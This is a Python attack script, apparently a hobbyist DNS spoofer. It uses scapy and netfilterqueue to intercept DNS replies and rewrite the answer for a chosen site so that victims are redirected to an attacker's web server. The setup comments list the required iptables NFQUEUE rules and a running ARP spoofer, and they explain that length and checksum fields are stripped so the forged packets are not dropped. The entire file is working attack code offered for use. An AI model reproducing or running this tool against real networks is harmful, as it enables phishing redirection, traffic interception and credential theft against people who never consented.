#!/usr/bin/python



# PREREQUISITES:-

# iptables --flush
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0

# [THESE COMMANDS CAN BE CODED IN A BASH SCRIPT TO RUN THIS SCRIPT]



# [ARPSPOOFER MUST BE RUNNING ON ATTCKER MACHINE]
# IP FORWARDING SHOULD BE ENABLED (SOP OF ARPSPOOFER)
# APACHE2 (OR WEB SERVER SHOULD BE RUNNING ON host_ip)
# THIS SCRIPT INTERCEPTS PACKETS AND CHANGES THE DNS HOST 
# TO THAT OF THE ATTACKER WEBSITE 



from scapy.all import *
import netfilterqueue as nf
import sys
from termcolor import colored	# use colored text output on the terminal
import optparse as op



# USAGE:-
# dnsSpoof.py <TARGET_SITE ADDRESS> <REDIRECTION_IP>



# THIS FUNCTION DELETES THE MENTIONED FIELDS FROM THE NECESSARY HEADERS
# THE IP AND UDP HEADERS CONSIST OF len AND checksum FIELDS
# WHICH ARE USED AS SECURITY MEASURES
# IF THE FIELDS ARE NOT THE SAME AS THE ORIGINAL PACKER
# THE PACKET IS DROPPED, DUE TO INCONSISTENCY (THUS INDICATING TAMPERING)
# HENCE THESE FIELDS ARE REMOVED TO AVOID ANY SUCH PACKET DROPPING

def del_fields(pkt):

	del pkt[IP].len
	del pkt[IP].chksum
	del pkt[UDP].len
	del pkt[UDP].chksum
	return pkt



# THIS FUNCTION CHANGES THE PACKET ATTRIBUTE VALUES
# TO CHANGE THE DESTINATION IP ADDRESS OF THE TARGET
# TO THAT OF THE ATTACKER IP ADDRESS
# BY INTERCEPTING THE PACKET AND CHANGING IP HEADER PAYLOADS
# SO THAT THE VICTIM IS REDIRECTED TO THE ATTACKER WEBSITE
# HOSTED ON OWN WEBSERVER (NEEDS TO BE RUNNING A SERVICE)

def process_Pkt(pkt):


	target_site = sys.argv[1]
	host_ip = sys.argv[2]
	
	scapy_pkt = IP(pkt.get_payload())								# intercept the original packet and get the payload field from the packet
	if scapy_pkt.haslayer(DNSRR):									# if a DNS response layer is present 
		qname = scapy_pkt[DNSQR].qname								# get the query name of the request
		if target_site in qname:									# if the query name is our target site
			answer = DNSRR(rrname=qname, rdata=host_ip)				# change the answer of the DNS request by changing the destination IP to our attacker IP

			scapy_pkt[DNS].an = answer								# assign this modified answer to the DNS packet
			scapy_pkt[DNS].ancount = 1								# # of such response packets is limited to 1
			
			scapy_pkt = del_fields(scapy_pkt)						# delete all the unncessary fields to prevent access denial - see function description
			pkt.set_payload(str(scapy_pkt))							# set the payload to the raw packet that was intercepted for forwarding

	pkt.accept()													# forward the packet




def main():

	if len(sys.argv) != 3:
		print("[!] Usage: dnsSpoof.py <TARGET_SITE> <REDIRECTION_IP>")
		quit()
	try:
		print("[!] Starting the DNS Spoofer")
		print(colored("[+] Target site : " + sys.argv[1], "green"))
		print(colored("[+] Redirected to : " + sys.argv[2], "green"))
		queue = nf.NetfilterQueue()											# make a queue in the IPTables
		queue.bind(0, process_Pkt)											# bind the queue at position 0 ; call proc_pkt function defined above
		queue.run()															# run the queue
	
	except KeyboardInterrupt:
		print("[!] Stopping the DNS Spoofer!")
		quit()
	
main()
